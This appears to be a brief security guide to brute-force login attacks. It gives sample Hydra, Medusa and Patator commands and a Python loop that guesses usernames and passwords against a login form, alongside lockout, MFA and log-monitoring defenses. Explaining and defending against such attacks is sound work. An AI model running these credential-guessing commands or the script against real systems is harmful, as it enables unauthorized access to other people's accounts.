This guide explains brute-force login attacks, including tools, techniques, and defenses. Brute force attacks involve systematically trying username-password combinations to gain unauthorized access to systems.

1. Common Brute Force Tools

Hydra

Fast and flexible tool for password attacks on various protocols (HTTP, FTP, SSH, etc.).

hydra -L users.txt -P passwords.txt ftp://example.com

Burp Suite (Intruder)

GUI-based brute forcing using payload positions and lists.

Configure Intruder positions & load wordlists for username/password fields.

Medusa

Parallel login brute forcer for various services.

medusa -h example.com -U users.txt -P passwords.txt -M ssh

Patator

Modular brute-forcing tool with extensive support for protocols.

patator ssh_login host=example.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt

2. Preventing Brute Force Attacks

  • Implement account lockouts after a few failed attempts.
  • Use CAPTCHAs to stop automated login attempts.
  • Enforce strong password policies.
  • Use multi-factor authentication (MFA).
  • Monitor login patterns and flag anomalies.

3. Login Brute Force Detection Tips

  • Check logs for repeated login failures from the same IP.
  • Monitor high-volume login requests to the same endpoint.
  • Set alerts for multiple failed logins in short timeframes.

4. Sample Python Script to Simulate Brute Force (Educational Use Only)

import requests

url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["123456", "admin", "password"]

for user in usernames:
    for pwd in passwords:
        r = requests.post(url, data={"username": user, "password": pwd})
        if "Invalid" not in r.text:
            print(f"[+] Success: {user}:{pwd}")

Summary

  • Brute force attacks exploit weak passwords and lack of login protections.
  • Tools like Hydra, Medusa, and Burp Suite automate this process.
  • Use detection and prevention mechanisms to protect applications.
